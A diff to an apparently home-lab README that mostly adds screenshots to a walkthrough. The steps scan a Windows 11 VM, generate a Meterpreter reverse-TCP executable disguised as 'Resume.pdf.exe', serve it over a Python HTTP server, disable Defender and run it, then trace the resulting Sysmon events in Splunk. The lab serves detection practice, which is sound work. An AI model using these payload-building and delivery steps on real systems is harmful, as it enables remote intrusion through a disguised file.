@@ -476,31 +476,89 @@ Step 4: Lets get started with NMAP by viewing the available commands. In the ter
 <img width="965" height="142" alt="image" src="https://github.com/user-attachments/assets/dd029763-cfa9-4159-8522-e324925ec877" />
 
 Step 5: Lets do command “nmap -A 192.168.20.10 -Pn” to scan our Windows 11 VM and skipping ping to see what information we receive from the Win 11 VM.   
+<img width="975" height="840" alt="image" src="https://github.com/user-attachments/assets/96f22c0e-8fd9-4ed1-bf22-8db8b18f2c99" />
+<img width="975" height="840" alt="image" src="https://github.com/user-attachments/assets/bd4a4ccb-7a2f-48bc-862d-6500cfa439c7" />
 
 
-Step 5: Lets create our malware using msfvenom. Do command “msfvenom + enter” in terminal.   
+Step 5.1: Lets create our malware using msfvenom. Do command “msfvenom + enter” in terminal.   
+<img width="975" height="825" alt="image" src="https://github.com/user-attachments/assets/d921aad8-b383-49a8-8c3c-7889a20a25f2" />
+<img width="975" height="167" alt="image" src="https://github.com/user-attachments/assets/45923848-31fa-4064-8322-5a91d29b1b7c" />
+
 Step 6: Lets see the available payloads we have by doing command “msfvenom -l payloads”. There will be plenty listed but we are using the “windows/x64/meterpreter/reverse_tcp” payload. Take note of  “windows/x64/meterpreter/reverse_tcp” since that is the one we will use. 
+<img width="975" height="835" alt="image" src="https://github.com/user-attachments/assets/5b7d95cd-aa9e-4318-a7d1-cd25785fd6cb" />
+
 Step 7: Lets start by building out our malware. Do command “msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe + enter”. This command will generate malware using reverse tcp payload which is instructed to connect back to our kali machine and port. The file format will be .exe and file name is Resume.pdf.exe.  
-Step 8: Type command “ls” to verify that the file was created and type command “file Resume.pdf.exe” to check what file it is.  
+<img width="975" height="842" alt="image" src="https://github.com/user-attachments/assets/3dc98246-3653-4e34-99bc-02fd29a6be8b" />
+
+Step 8: Type command “ls” to verify that the file was created and type command “file Resume.pdf.exe” to check what file it is.
+<img width="975" height="806" alt="image" src="https://github.com/user-attachments/assets/bd8a2376-345d-4e0d-9459-c7fc4534d6c6" />
+
 Step 9: Now that we have our binary lets open up a handler that will listen in on the port that we have configured by using metasploit. Do command “msfconsole + enter” > “use exploit/multi/handler + enter”  
+<img width="975" height="804" alt="image" src="https://github.com/user-attachments/assets/3e352012-d3e0-4519-acbe-63236b2c56c9" />
+
 Step 10: do command “options” to see what we can configure. Notice that the payload option is set to “generic/shell_reverse_tcp” we need to use the same payload we used when configuring our malware in msfvenom. 
+<img width="975" height="848" alt="image" src="https://github.com/user-attachments/assets/3afa3c8b-d49a-4fa9-b843-063d6bb7ed93" />
+
 Step 11: lets change it. Do command “Set payload windows/x64/meterpreter/reverse_tcp + enter” then type command “options” again to verify the change.  
-Step 12: Lets configure “LHOST” to correspond to our attacker machine (Kali) by doing command “set lhost 192.168.20.11 + enter” then command “options” to verify change.  
-Step 13: Lets start this handler by doing command “exploit + enter”. Now we wait until the malware is executed in the Win 11 VM. 
+<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/472cb7aa-ca32-4660-9b69-0d9d33e434a7" />
+
+Step 12: Lets configure “LHOST” to correspond to our attacker machine (Kali) by doing command “set lhost 192.168.20.11 + enter” then command “options” to verify change.
+<img width="975" height="842" alt="image" src="https://github.com/user-attachments/assets/06a1d36e-4ec8-42be-b415-0c904d4243aa" />
+
+Step 13: Lets start this handler by doing command “exploit + enter”. Now we wait until the malware is executed in the Win 11 VM.
+<img width="975" height="838" alt="image" src="https://github.com/user-attachments/assets/4c086fbc-7426-49a0-b617-9cbcb3e9dca8" />
+
 Step 14: We need to create a fast http server using python so we can import our malware to the Win 11 VM. Click on “Session, New Tab” to open up a new tab. Make sure we are in the same directory as our malware by doing command “ls”.   
+<img width="975" height="835" alt="image" src="https://github.com/user-attachments/assets/30efb64a-59c5-41bc-ac71-c92d8f88ef78" />
+<img width="975" height="827" alt="image" src="https://github.com/user-attachments/assets/1ef3d21d-73c3-4472-825e-09a02c83cf7b" />
+
 Step 15: Lets create the server. Do command “python3 -m http.server 9999 + enter”. After pressing enter the server is now live and hosting the malware file “Resume.pdf.exe”. 
-Step 16: Lets switch over to our Win 11 Pro VM. First we need to turn off real time detection on Windows Security. Again we created a simple malware. Our main goal is to test Splunk and Sysmon when malware is executed. Search “Windows Security” > Virus & Threat protection > Virus & Threat protection settings > manage settings > turn off “Real-time protection”.     
+<img width="975" height="835" alt="image" src="https://github.com/user-attachments/assets/fcadddf6-4dc8-452d-bb20-99781b7b6a81" />
+
+Step 16: Lets switch over to our Win 11 Pro VM. First we need to turn off real time detection on Windows Security. Again we created a simple malware. Our main goal is to test Splunk and Sysmon when malware is executed. Search “Windows Security” > Virus & Threat protection > Virus & Threat protection settings > manage settings > turn off “Real-time protection”.
+<img width="975" height="815" alt="image" src="https://github.com/user-attachments/assets/1a3a5e3c-91b1-4b80-94b4-6917ff707ffe" />
+<img width="975" height="810" alt="image" src="https://github.com/user-attachments/assets/59b9b125-6d94-4b6e-a5f9-feae4e87cb4d" />
+<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/b3be45f4-bf96-433a-a673-89b82bfbee49" />
+<img width="975" height="723" alt="image" src="https://github.com/user-attachments/assets/a02e245e-7764-4f6c-94b2-3e40a5a9702a" />
+
 Step 17: Let's go to the python server we created by opening up a browser > search = 192.168.20.11:9999 + enter”. The ip address is the kali machine on port 9999. Download “Resume.pdf.exe”.  
+<img width="975" height="813" alt="image" src="https://github.com/user-attachments/assets/ad1e2cea-ed06-4444-9dba-d3eb945c5c8e" />
+<img width="975" height="817" alt="image" src="https://github.com/user-attachments/assets/50383ad9-cbc5-4bc4-a87f-cdfaa0ab03b4" />
+
 Step 18: Let's execute the malware. Open “Resume.pdf.exe”  > click “Run” 
+<img width="975" height="815" alt="image" src="https://github.com/user-attachments/assets/f089004b-9308-45f2-bcbb-16dc4079cbe3" />
+
 Step 19: Lets return to the Splunk home page to see what useful telemetry we generated. Go to app > Search & Reporting > Search = “index=endpoint 192.168.20.11 + enter”. Lets first check what telemetry shows when we search up our kali machine ip of 192.168.20.11.    
+<img width="975" height="917" alt="image" src="https://github.com/user-attachments/assets/9854ae11-a59e-407c-bd96-3dab858980ff" />
+<img width="975" height="908" alt="image" src="https://github.com/user-attachments/assets/e20743d1-bfa5-4435-806d-f07e834a49e2" />
+<img width="975" height="917" alt="image" src="https://github.com/user-attachments/assets/c95629e4-feeb-450e-b5c3-8ff1beb6d000" />
+
 Step 20: Scroll down until you see “dest_port” then click on it  
+<img width="975" height="908" alt="image" src="https://github.com/user-attachments/assets/bb1b219a-2cf7-4eca-99f9-b16ae73c4ddc" />
+
 Step 21: This telematry tells us that ip 192.168.20.11 is attempting to reach port 4444. Port 4444 is commonly used by metasploit default payloads and other malware/command-and-control channels. For security context, if a machine is trying to reach port 4444 it may indicate an attempted reverse shell or remote exploitation attempt. Necessary actions to take next is to verify the source, check system for malware, set up firewall rules to block port 4444 if its not intended, and monitor network logs.
 Step 22: Lets look at more telemetry. But this time lets search the malware name that was executed by typing in “index=endpoint resume.pdf.exe + enter”.   
+<img width="975" height="900" alt="image" src="https://github.com/user-attachments/assets/93021cbf-96d0-43e6-aad3-f16abd501fd4" />
+
 Step 23: As you can see we have logged 303 events. Scroll down until you see “EventCode” then click on it.  
-Step 24: Lets focus on event code 1. 
+<img width="975" height="913" alt="image" src="https://github.com/user-attachments/assets/bba7bc66-cf41-46a9-9e3e-0a9a542f72e5" />
+
+Step 24: Lets focus on event code 1.
+<img width="975" height="921" alt="image" src="https://github.com/user-attachments/assets/ae650c54-3cc2-4ebc-91e4-18ac6ea61f91" />
+
 Step 25: We can see that event code 1 logged 30 events. Click on the latest event and expand it. Then scroll down and until you see “ProcessGuid”   
+<img width="975" height="913" alt="image" src="https://github.com/user-attachments/assets/ab3b7464-8a21-4299-9054-d28276f4912d" />
+<img width="975" height="913" alt="image" src="https://github.com/user-attachments/assets/9525ddf3-1f1f-4483-bebb-9fbaf085e796" />
+
 Step 26: Copy and paste the “ProcessGuid” value into search bar so its “index=endpoint {ProcessGuidValue} + Enter” 
+<img width="975" height="906" alt="image" src="https://github.com/user-attachments/assets/70c9414a-283d-4dd3-acf4-d4154ea0496e" />
+<img width="975" height="879" alt="image" src="https://github.com/user-attachments/assets/c29717cd-d568-4098-9f00-985e41410c42" />
+
 Step 27: 5 events is logged. Lets clean up the search query by adding in |table _time,ParentImage,Image,CommandLine after the “ProcessGuid”. So its “index=endpoint {ProccessGuid} |table _time,ParentImage,Image,CommandLine + enter”.    
+<img width="975" height="906" alt="image" src="https://github.com/user-attachments/assets/221aa354-9649-4f4b-8158-50e1bfbc930b" />
+<img width="975" height="904" alt="image" src="https://github.com/user-attachments/assets/c099dcf1-a519-4c26-a3f0-e0911a796ef8" />
+<img width="975" height="773" alt="image" src="https://github.com/user-attachments/assets/519bdf49-e57c-44ce-b659-a531688261f3" />
+
 Step 28: Lets analyze the ParentImage, Image, and CommandLine. Parent process “resume.pdf.exe” is suspicious because pdfs are never .exes. We can conclude that this is malware disguised as a pdf file. It was located in downloads which is common for malicious payloads. Child process “WerFault.exe” is a legitimate windows error reporting executable. However, it is suspicious because “resume.pdf.exe” spawned “WerFault.exe” which is not normal behavior. WerFault is usually triggered when covering up a crash it caused, run malicious code before or after a crash, and blending in with normal system process. Command line arguments “WerFault.exe -u -p 1052 -s 432” parameters are legitimate because Windows Error Reporting launches like this when a process crashes. In summary, malware “resume.pdf.exe” crashed, and WerFault was triggered to report it.
 
 
